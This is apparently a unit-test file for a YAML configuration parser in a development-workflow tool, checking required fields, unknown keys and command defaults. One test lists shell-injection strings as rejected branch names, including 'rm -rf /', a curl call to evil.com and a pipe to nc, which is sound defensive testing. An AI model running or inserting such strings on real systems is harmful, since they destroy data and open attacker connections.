// Split from lib.test.js under issue #1467 for the 500-LOC limit
// (docs/CODING_STANDARDS.md). Test bodies are unchanged.

import { after, describe, it } from "node:test";
import assert from "node:assert/strict";
import {
  DEFAULT_DEV_START_GATE_REQUIRED_FIELDS,
  DEFAULT_POLICY_COMMAND,
  DEFAULT_PRECOMMIT_COMMAND,
  parseGroundControlYaml,
} from "./lib.js";

describe("parseGroundControlYaml", () => {
  // Most cases build a YAML document from an array of lines and parse it.
  // `parseYamlLines` removes the repeated `[...].join("\n")` + parse scaffold,
  // and `expectYamlError` additionally asserts the standard "invalid, with an
  // error message containing <substr>" shape used by the rejection cases.
  function parseYamlLines(lines) {
    return parseGroundControlYaml(lines.join("\n"));
  }

  function expectYamlError(lines, substr) {
    const result = parseYamlLines(lines);
    assert.equal(result.ok, false);
    assert.ok(result.errors.some((e) => e.includes(substr)));
    return result;
  }


  it("parses a minimal valid yaml", () => {
    const result = parseGroundControlYaml("schema_version: 1\nproject: aces-sdl\n");
    assert.equal(result.ok, true);
    assert.equal(result.value.project, "aces-sdl");
    assert.equal(result.value.github_repo, null);
    assert.equal(result.value.short_code, null);
    assert.deepEqual(result.value.workflow, {
      test_command: null,
      completion_command: null,
      lint_command: null,
      format_command: null,
      policy_command: "make policy",
      precommit_command: "pre-commit run --hook-stage pre-commit",
      base_branch: null,
      codex_review: { pre_push_cap: null, non_verdict_retry_limit: null },
      test_quality_review: { pre_push_cap: null, non_verdict_retry_limit: null },
      pr_title: null,
      integration_manager: { approval_label: null, ordering: null, max_queue_size: null, merge_strategy: null },
      dev_start_gate: {
        enabled: false,
        required_for: "source-bearing",
        plan_section: "Dev-Start Gate",
        blocker_uids: [],
        required_fields: [...DEFAULT_DEV_START_GATE_REQUIRED_FIELDS],
      },
      review_disposition: { enabled: false, mode: "shadow", max_auto_overrides: 1, judge: { enabled: false, model: null } },
    });
    assert.equal(result.value.sonarcloud, null);
    assert.equal(result.value.rules.plan_rules_path, null);
    assert.equal(result.value.knowledge, null);
    assert.equal(result.value.grc, undefined);
  });


  it("parses a fully populated yaml", () => {
    const result = parseYamlLines([
      "schema_version: 1",
      "project: ground-control",
      "github_repo: KeplerOps/Ground-Control",
      "workflow:",
      "  test_command: cd backend && ./gradlew test -Pquick",
      "  completion_command: make check",
      "  lint_command: cd backend && ./gradlew spotlessCheck",
      "  format_command: cd backend && ./gradlew spotlessApply",
      "sonarcloud:",
      "  project_key: KeplerOps_Ground-Control",
      "  organization: KeplerOps",
      "rules:",
      "  plan_rules: .gc/plan-rules.md",
      "knowledge:",
      "  dir: docs/knowledge",
      "  schema: docs/knowledge/SCHEMA.md",
      "  inbox: docs/knowledge/inbox",
      "",
    ]);
    assert.equal(result.ok, true);
    assert.equal(result.value.project, "ground-control");
    assert.equal(result.value.github_repo, "KeplerOps/Ground-Control");
    assert.equal(result.value.workflow.completion_command, "make check");
    assert.equal(result.value.sonarcloud.project_key, "KeplerOps_Ground-Control");
    assert.equal(result.value.sonarcloud.organization, "KeplerOps");
    assert.equal(result.value.rules.plan_rules_path, ".gc/plan-rules.md");
    assert.deepEqual(result.value.knowledge, {
      dir: "docs/knowledge",
      schema: "docs/knowledge/SCHEMA.md",
      inbox: "docs/knowledge/inbox",
    });
    assert.equal(result.value.grc, undefined);
  });


  it("rejects invalid yaml text", () => {
    const result = parseGroundControlYaml("project: a\n  bad: [unclosed");
    assert.equal(result.ok, false);
    assert.ok(result.errors[0].includes("parse"));
  });


  it("requires schema_version", () => {
    const result = parseGroundControlYaml("project: x\n");
    assert.equal(result.ok, false);
    assert.ok(result.errors.some((e) => e.includes("schema_version")));
  });


  it("rejects unsupported schema_version", () => {
    const result = parseGroundControlYaml("schema_version: 99\nproject: x\n");
    assert.equal(result.ok, false);
    assert.ok(result.errors.some((e) => e.includes("schema_version")));
  });


  it("requires project", () => {
    const result = parseGroundControlYaml("schema_version: 1\n");
    assert.equal(result.ok, false);
    assert.ok(result.errors.some((e) => e.includes("project")));
  });


  it("rejects an uppercase project identifier", () => {
    const result = parseGroundControlYaml("schema_version: 1\nproject: ACES_SDL\n");
    assert.equal(result.ok, false);
    assert.ok(result.errors.some((e) => e.includes("lowercase identifier")));
  });


  it("rejects unknown top-level keys", () => {
    const result = parseGroundControlYaml("schema_version: 1\nproject: x\nbogus: true\n");
    assert.equal(result.ok, false);
    assert.ok(result.errors.some((e) => e.includes("unknown top-level key")));
  });


  it("rejects workflow unknown keys", () => {
    const yaml = "schema_version: 1\nproject: x\nworkflow:\n  bogus: nope\n";
    const result = parseGroundControlYaml(yaml);
    assert.equal(result.ok, false);
    assert.ok(result.errors.some((e) => e.includes("workflow has unknown key")));
  });


  it("normalizes an omitted workflow.policy_command to the default policy command", () => {
    const result = parseGroundControlYaml("schema_version: 1\nproject: x\n");
    assert.equal(result.ok, true);
    assert.equal(result.value.workflow.policy_command, DEFAULT_POLICY_COMMAND);
    assert.equal(DEFAULT_POLICY_COMMAND, "make policy");
  });


  it("normalizes an omitted workflow.precommit_command to the default", () => {
    const result = parseGroundControlYaml("schema_version: 1\nproject: x\n");
    assert.equal(result.ok, true);
    assert.equal(result.value.workflow.precommit_command, DEFAULT_PRECOMMIT_COMMAND);
  });


  it("accepts a repo-authored workflow.precommit_command", () => {
    const yaml = [
      "schema_version: 1",
      "project: x",
      "workflow:",
      "  precommit_command: lefthook run pre-commit",
      "",
    ].join("\n");
    const result = parseGroundControlYaml(yaml);
    assert.equal(result.ok, true, JSON.stringify(result.errors));
    assert.equal(result.value.workflow.precommit_command, "lefthook run pre-commit");
  });


  it("rejects an empty workflow.precommit_command", () => {
    expectYamlError(
      ["schema_version: 1", "project: x", "workflow:", '  precommit_command: ""', ""],
      "workflow.precommit_command must be a non-empty string when set",
    );
  });


  it("accepts a repo-authored workflow.policy_command", () => {
    const yaml = [
      "schema_version: 1",
      "project: x",
      "workflow:",
      "  policy_command: python3 scripts/adr_guard/adr_guard.py --all --level ci",
      "",
    ].join("\n");
    const result = parseGroundControlYaml(yaml);
    assert.equal(result.ok, true, JSON.stringify(result.errors));
    assert.equal(
      result.value.workflow.policy_command,
      "python3 scripts/adr_guard/adr_guard.py --all --level ci",
    );
  });


  it("rejects an empty workflow.policy_command rather than silently defaulting", () => {
    // A misconfigured gate must fail loudly. Falling back to the default here
    // would let a repo that meant to name its own gate lose it unnoticed.
    expectYamlError(
      ["schema_version: 1", "project: x", "workflow:", '  policy_command: "   "', ""],
      "workflow.policy_command must be a non-empty string when set",
    );
  });


  it("accepts safe workflow.base_branch values", () => {
    for (const branch of ["dev", "main", "develop", "release/v1.2.3", "feature_x", "v2.x", "topic/sub-topic"]) {
      const yaml = `schema_version: 1\nproject: x\nworkflow:\n  base_branch: ${branch}\n`;
      const result = parseGroundControlYaml(yaml);
      assert.equal(result.ok, true, `expected '${branch}' to be accepted but got: ${JSON.stringify(result.errors)}`);
      assert.equal(result.value.workflow.base_branch, branch);
    }
  });


  it("rejects workflow.base_branch with shell metacharacters or unsafe ref shapes", () => {
    // Each entry is a shell-injection or git-check-ref-format violation that
    // would be unsafe to render into `gh issue develop --base ...` etc.
    // YAML-quoted so values like `dev; rm -rf /` parse as a single scalar.
    const cases = [
      "'dev; rm -rf /'", // command separator
      "'dev && curl evil.com'", // command chain
      "'dev | nc evil 1337'", // pipe to attacker
      "'dev$(whoami)'", // command substitution
      "'dev`whoami`'", // backtick substitution
      "'dev > /tmp/x'", // redirection
      "'../etc/passwd'", // path traversal in ref
      "'/dev'", // leading slash
      "'-dev'", // option-shaped ref
      "'dev/'", // trailing slash
      "'.dev'", // leading dot
      "'topic/.dev'", // dot-prefixed component
      "'dev.'", // trailing dot
      "'topic/dev.'", // dot-suffixed component
      "'dev.lock'", // .lock suffix
      "'topic/dev.lock'", // .lock-suffixed component
      "'feat..ure'", // double-dot
      "'feat//ure'", // double-slash
      "'dev space'", // whitespace
      "'dev~1'", // ~ disallowed by git
      "'dev:foo'", // : disallowed by git
      "'dev*'", // * disallowed by git
      "'dev?'", // ? disallowed by git
      "'dev[1]'", // [ disallowed by git
      "'dev\\foo'", // backslash
    ];
    for (const value of cases) {
      const yaml = `schema_version: 1\nproject: x\nworkflow:\n  base_branch: ${value}\n`;
      const result = parseGroundControlYaml(yaml);
      assert.equal(result.ok, false, `expected ${value} to be rejected`);
      assert.ok(
        result.errors.some((e) => e.includes("base_branch") && e.includes("safe Git ref name")),
        `expected base_branch validation error for ${value}, got: ${JSON.stringify(result.errors)}`,
      );
    }
  });


  // ---------------------------------------------------------------------
  // workflow.codex_review.pre_push_cap (issue #906)
  // ---------------------------------------------------------------------

  it("accepts a workflow.codex_review.pre_push_cap integer", () => {
    const result = parseYamlLines([
      "schema_version: 1",
      "project: x",
      "workflow:",
      "  codex_review:",
      "    pre_push_cap: 2",
      "",
    ]);
    assert.equal(result.ok, true, JSON.stringify(result.errors));
    assert.deepEqual(result.value.workflow.codex_review, { pre_push_cap: 2, non_verdict_retry_limit: null });
  });


  it("defaults workflow.codex_review.pre_push_cap when the block is absent", () => {
    const yaml = "schema_version: 1\nproject: x\n";
    const result = parseGroundControlYaml(yaml);
    assert.equal(result.ok, true);
    // Cap default lives at the MCP-tool layer (so override_cap-aware callers
    // see the consistent number) — the parser surfaces null to mean
    // "use the tool default".
    assert.deepEqual(result.value.workflow.codex_review, { pre_push_cap: null, non_verdict_retry_limit: null });
  });


  it("rejects workflow.codex_review with unknown keys", () => {
    const result = parseYamlLines([
      "schema_version: 1",
      "project: x",
      "workflow:",
      "  codex_review:",
      "    pre_push_cap: 1",
      "    bogus: true",
      "",
    ]);
    assert.equal(result.ok, false);
    assert.ok(result.errors.some((e) => e.includes("workflow.codex_review") && e.includes("unknown key")));
  });


  it("rejects a non-integer workflow.codex_review.pre_push_cap", () => {
    for (const bad of ["'three'", "3.5", "true"]) {
      const result = parseYamlLines([
        "schema_version: 1",
        "project: x",
        "workflow:",
        "  codex_review:",
        `    pre_push_cap: ${bad}`,
        "",
      ]);
      assert.equal(result.ok, false, `expected ${bad} to fail`);
      assert.ok(result.errors.some((e) => e.includes("pre_push_cap") && e.includes("integer")));
    }
  });


  it("rejects workflow.codex_review.pre_push_cap outside [1, 10]", () => {
    // Lower bound: must be at least 1 (zero would mean "no review allowed",
    // which is what `/quickfix` without `--review` achieves by not invoking
    // the reviewer at all; the cap is for runs that DO invoke it).
    // Upper bound: 10 is a safety net against runaway loops at the cap; the
    // empirical worst case in this repo's history is 4 cycles.
    for (const bad of [0, -1, 11, 100]) {
      const result = parseYamlLines([
        "schema_version: 1",
        "project: x",
        "workflow:",
        "  codex_review:",
        `    pre_push_cap: ${bad}`,
        "",
      ]);
      assert.equal(result.ok, false, `expected ${bad} to fail`);
      assert.ok(result.errors.some((e) => e.includes("pre_push_cap")));
    }
  });


  // ---------------------------------------------------------------------
  // workflow.test_quality_review.pre_push_cap (issue #906)
  // ---------------------------------------------------------------------

  it("accepts a workflow.test_quality_review.pre_push_cap integer", () => {
    const result = parseYamlLines([
      "schema_version: 1",
      "project: x",
      "workflow:",
      "  test_quality_review:",
      "    pre_push_cap: 2",
      "",
    ]);
    assert.equal(result.ok, true, JSON.stringify(result.errors));
    assert.deepEqual(result.value.workflow.test_quality_review, { pre_push_cap: 2, non_verdict_retry_limit: null });
  });


  it("rejects workflow.test_quality_review with unknown keys", () => {
    const result = parseYamlLines([
      "schema_version: 1",
      "project: x",
      "workflow:",
      "  test_quality_review:",
      "    pre_push_cap: 1",
      "    bogus: true",
      "",
    ]);
    assert.equal(result.ok, false);
    assert.ok(
      result.errors.some((e) => e.includes("workflow.test_quality_review") && e.includes("unknown key")),
    );
  });

  it("parses a knowledge section with only dir and leaves overrides null", () => {
    const result = parseYamlLines([
      "schema_version: 1",
      "project: ground-control",
      "knowledge:",
      "  dir: docs/knowledge",
      "",
    ]);
    assert.equal(result.ok, true);
    assert.deepEqual(result.value.knowledge, {
      dir: "docs/knowledge",
      schema: null,
      inbox: null,
    });
  });


  it("requires knowledge.dir when the knowledge section is set", () => {
    expectYamlError([
      "schema_version: 1",
      "project: ground-control",
      "knowledge:",
      "  schema: docs/knowledge/SCHEMA.md",
      "",
    ], "knowledge.dir is required");
  });


  it("rejects unknown keys inside knowledge", () => {
    expectYamlError([
      "schema_version: 1",
      "project: ground-control",
      "knowledge:",
      "  dir: docs/knowledge",
      "  bogus: true",
      "",
    ], "knowledge has unknown key 'bogus'");
  });


  it("rejects knowledge when it is not a mapping", () => {
    expectYamlError([
      "schema_version: 1",
      "project: ground-control",
      "knowledge:",
      "  - docs/knowledge",
      "",
    ], "knowledge must be a mapping");
  });


  it("rejects an empty knowledge.dir", () => {
    expectYamlError([
      "schema_version: 1",
      "project: ground-control",
      "knowledge:",
      "  dir: ''",
      "",
    ], "knowledge.dir is required");
  });
});
